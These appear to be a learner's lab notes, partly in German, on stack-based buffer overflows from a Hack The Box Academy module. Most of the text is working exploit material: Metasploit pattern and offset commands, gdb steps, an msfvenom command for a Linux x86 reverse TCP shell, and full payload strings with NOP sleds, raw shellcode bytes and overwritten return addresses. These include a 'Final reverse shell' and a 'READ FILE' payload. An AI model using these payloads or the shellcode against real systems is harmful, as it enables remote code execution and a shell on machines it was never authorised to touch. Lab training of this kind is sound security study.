Stack based Overflows

![image](https://academy.hackthebox.eu/storage/modules/31/buffer_overflow_1.png)

get the `instruction pointer` (`EIP`) under control
This will make the `EIP` point to the address where our `shellcode` starts and causes the CPU to execute it.

https://www.ins1gn1a.com/basics-of-gdb-and-pwndbg


![image](https://academy.hackthebox.eu/storage/modules/31/buffer_overflow_2.png)


Creating 1200 differnt chars and get offset

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
```

make sure to control the eip
```shell-session
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")
```

1.  We need a total of 1040 bytes to get to the `EIP`.
2.  Here, we can use an additional `100 bytes` of `NOPs`
3.  `150 bytes` for our `shellcode`.

![[docs/Pasted image 20210210191554.png]]

```shell-session
Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4'
```

```shell-session
run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```

![[docs/Pasted image 20210210191804.png]]

```shell-session
python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```


echo $CHARS | wc -c 

```shell-session
(gdb) disas main
```

```shell-session
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

```shell-session
(gdb) x/2000xb $esp+500
```
x/wiederholung{format} Zieladresse + offset

Wir nehmen die ESP Adresse (da diese ja noch vor der EIP beschrieben wird)
esp            0xffffd174       0xffffd174

dann suchen wir ab wann die 0x55 beginnen
![[docs/Pasted image 20210213180657.png]]

nehmen das als start Adresse und zählen noch 5 Bytes dazu, damit wir extaxt beim Start ankommen, dann zählen wir die Anzahl der X55 prints dazu (minus 1 vorsichtshalber) um genau nach den X55 anzukommen und geben genau 256 Zeichen aus

![[docs/Pasted image 20210213180934.png]]

Am Ende sieht man das die EIP Überschreibung kommt mit X66

![[docs/Pasted image 20210213181107.png]]

# Create shell

```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=9999 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellBuff
```

one line shell output

cat shellBuff | sed ':a;N;$!ba;s/\n//g' | sed 's/"//g'

```shell-session
Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

1040 bis EIP
124 für die NOPs
95 für die Shell
4 für den EIP


```shell-session
run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + \xb8\x99\xe6\x55\x7e\xd9\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x5a\xe2\xb7\x8b\x6d\x30\xc0\x97\xde\x85\x7c\x32\xe2\x80\x62\x72\x84\x5f\xe4\xe0\x11\xd0\xda\xcb\x21\x59\x5c\x2d\x49\x25\x9e\xcd\x88\xb1\x9c\xcd\xad\x4e\x28\x2c\x01\x36\x7a\xfe\x32\x04\x79\x89\x55\xa7\xfe\xdb\xfd\x56\xd0\xa8\x95\xce\x01\x60\x07\x66\xd7\x9d\x95\x2b\x6e\x80\xa9\xc7\xbd\xc3" + "\x66" * 4')
```

![[docs/Pasted image 20210213183354.png]]

info proc all

# Jump to NOPs

![image](https://academy.hackthebox.eu/storage/modules/31/buffer_overflow_9.png)

direkt the EIP to the NOPs

0x ff ff d6 e8

![[docs/Pasted image 20210213201521.png]]

```shell-session
run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xb8\x99\xe6\x55\x7e\xd9\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x5a\xe2\xb7\x8b\x6d\x30\xc0\x97\xde\x85\x7c\x32\xe2\x80\x62\x72\x84\x5f\xe4\xe0\x11\xd0\xda\xcb\x21\x59\x5c\x2d\x49\x25\x9e\xcd\x88\xb1\x9c\xcd\xad\x4e\x28\x2c\x01\x36\x7a\xfe\x32\x04\x79\x89\x55\xa7\xfe\xdb\xfd\x56\xd0\xa8\x95\xce\x01\x60\x07\x66\xd7\x9d\x95\x2b\x6e\x80\xa9\xc7\xbd\xc3" + "\xe8\xd6\xff\xff"')
```


![[docs/Pasted image 20210213203703.png]]

![[docs/Pasted image 20210213203839.png]]

# Skill Assessment



2060 bis EIP
2064 ink EIP

100 NOPs

2060 

```bash
"\x55" * 1804 + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4
```

Start of x55
0xffffcf98

95byte für die shell

shell 

```bash
\xbf\x9c\x76\x6b\x2d\xdd\xc5\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\xe1\x78\x89\xd8\x28\x5e\xba\xc0\x19\x23\x16\x6d\x9f\x2a\x79\xc1\xf9\xe1\xfa\xb1\x5c\x4a\xc5\x78\xde\xe3\x43\x7a\xb6\xf9\xb9\x72\x4b\x96\xbf\x8a\x74\x69\x49\x6b\xca\x13\x19\x3d\x79\x6f\x9a\x34\x9c\x42\x1d\x14\x36\x33\x31\xea\xae\xa3\x62\x23\x4c\x5d\xf4\xd8\xc2\xce\x8f\xfe\x52\xfb\x42\x80
```

2060 - 100 - 95 = 1865

```bash
"\x55" * 1865 + "\x90" *100 + "\xbf\x9c\x76\x6b\x2d\xdd\xc5\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\xe1\x78\x89\xd8\x28\x5e\xba\xc0\x19\x23\x16\x6d\x9f\x2a\x79\xc1\xf9\xe1\xfa\xb1\x5c\x4a\xc5\x78\xde\xe3\x43\x7a\xb6\xf9\xb9\x72\x4b\x96\xbf\x8a\x74\x69\x49\x6b\xca\x13\x19\x3d\x79\x6f\x9a\x34\x9c\x42\x1d\x14\x36\x33\x31\xea\xae\xa3\x62\x23\x4c\x5d\xf4\xd8\xc2\xce\x8f\xfe\x52\xfb\x42\x80"+ "\x66" * 4
```

NOP Adresse: 0x ff ff d7 25


	\x25\xd7\xff\xff

Final reverse shell

```bash
run $(python -c 'print "\x55" * 1865 + "\x90" *100 + "\xbf\x9c\x76\x6b\x2d\xdd\xc5\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\xe1\x78\x89\xd8\x28\x5e\xba\xc0\x19\x23\x16\x6d\x9f\x2a\x79\xc1\xf9\xe1\xfa\xb1\x5c\x4a\xc5\x78\xde\xe3\x43\x7a\xb6\xf9\xb9\x72\x4b\x96\xbf\x8a\x74\x69\x49\x6b\xca\x13\x19\x3d\x79\x6f\x9a\x34\x9c\x42\x1d\x14\x36\x33\x31\xea\xae\xa3\x62\x23\x4c\x5d\xf4\xd8\xc2\xce\x8f\xfe\x52\xfb\x42\x80"+ "\x25\xd7\xff\xff"')
```


READ FILE
```bash
run $(python -c 'print "\x55" * 1860 + "\x90" *100 + "\xd9\xc5\xbe\xe4\xd7\x4a\xd5\xd9\x74\x24\xf4\
x5f\x29\xc9\xb1\x13\x31\x77\x18\x03\x77\x18\x83\xc7\xe0\x35\xbf\x3e\xde\x01\x45\xc1\x1e\x72\x1d\xf0\xd7\x
bf\x21\x7b\x24\x87\x21\x7c\xaa\xf8\xac\x9b\x23\x01\x14\x63\x23\xf2\x69\xa9\xc3\x7b\xab\x89\xc7\x7b\x2c\xe
a\x7c\x7a\x2c\xea\x82\xb0\xac\x52\x83\x4a\xad\xa2\x38\x4a\xad\xa2\x3e\x86\x2d\x4a\xfb\xe7\xd1\x74\x2c\x7d
\x5a\xe8\x1d\x0d\xc3\x9d\x12\x9a\x67\x62"+ "\x25\xd7\xff\xff"')
```